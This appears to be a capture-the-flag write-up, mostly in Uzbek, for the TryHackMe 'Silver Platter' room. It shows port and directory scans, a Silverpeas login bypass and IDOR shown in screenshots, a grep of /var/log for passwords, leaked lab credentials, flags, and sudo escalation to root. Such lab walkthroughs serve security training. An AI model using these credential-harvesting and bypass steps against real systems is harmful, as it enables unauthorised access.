# Silver Platter

Room: https://tryhackme.com/room/silverplatter



## Avvalo Razvetka!!!

Port Scanning:

```

╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.165.17 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.165.17:22
Open 10.10.165.17:80
Open 10.10.165.17:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.165.17
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 01:17 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 01:17
Scanning 10.10.165.17 [2 ports]
Completed Ping Scan at 01:17, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:17
Completed Parallel DNS resolution of 1 host. at 01:17, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:17
Scanning 10.10.165.17 [3 ports]
Discovered open port 80/tcp on 10.10.165.17
Discovered open port 22/tcp on 10.10.165.17
Discovered open port 8080/tcp on 10.10.165.17
Completed Connect Scan at 01:17, 0.10s elapsed (3 total ports)
Initiating Service scan at 01:17
Scanning 3 services on 10.10.165.17
Completed Service scan at 01:19, 81.56s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.165.17.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:19
Completed NSE at 01:19, 0.49s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:19
Completed NSE at 01:19, 1.19s elapsed
Nmap scan report for 10.10.165.17
Host is up, received syn-ack (0.10s latency).
Scanned at 2025-06-15 01:17:57 +05 for 84s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=6/15%Time=684DD8FC%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Sat,\
SF:x2014\x20Jun\x202025\x2020:18:04\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Sat,\x201
SF:4\x20Jun\x202025\x2020:18:04\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Sat,\x2014\x20Jun\x202025\x2020:18:04\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.66 seconds
```

22,80,8080 portlar ochiq

Bizda 2ta veb server bor.

80-portga nisbatan routinglar:

```
mete@sec ~> gobuster dir -u http://10.10.165.17/ -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.165.17/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://10.10.165.17/images/]
/assets               (Status: 301) [Size: 178] [--> http://10.10.165.17/assets/]
```

8080portga nisbatan:

```
╭─mete   󰉖 ~
╰─ ❯❯ fish
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
mete@sec ~> gobuster dir -u http://10.10.165.17:8080/ -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.165.17:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/website              (Status: 302) [Size: 0] [--> http://10.10.165.17:8080/website/]
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
```

80-portni o'rganib chiqamiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate.jpg)



8080 uchun biz bu orqali routing topdik.

Username ham bizda bor.

/silverpeas routinggi:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate_2.jpg)

## Web Hacking

Silverpeas bo'yicha zaiflik qidirdik.

Agar password argumetni berilmasa parolsiz AUTH bo'lar ekan.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate_3.jpg)

Kirib ham oldik:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate_4.jpg)

Va bir qiziq joyini topdik:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate53.jpg)

Aha.... IDORni xidi kelyapti)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate_6.jpg)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/silverplate_7.jpg)

**Bingo!**

**user:** tim

**password:** cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol



**user.txt**'ni qo'lga kiritish:

```
tim@silver-platter:~$ ls                                     
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```



## Privilage Escalation

Tizimda bor foydaluvchilar:

```
tim@silver-platter:/home$ ls
tim  tyler
```



Cyber Ninja(Beksulton aka):

> Buyruq: 
>
> ```
> grep -iR "pass" /var/log/
> ```
>
> Natija:
>
> ```
> /var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
> ```

**user:** Tyler

**password:** _Zd_zx7N823/

tyler huquqlari:

````
tyler@silver-platter:~$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
````

sudo buryug'ini cheklovlarsiz ishlata olarkan.

**root.txt**ni qo'lga kiritish:

```
tyler@silver-platter:~$ sudo cat /root/root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```



# Nafas olar ekanman, men yana davom etaman...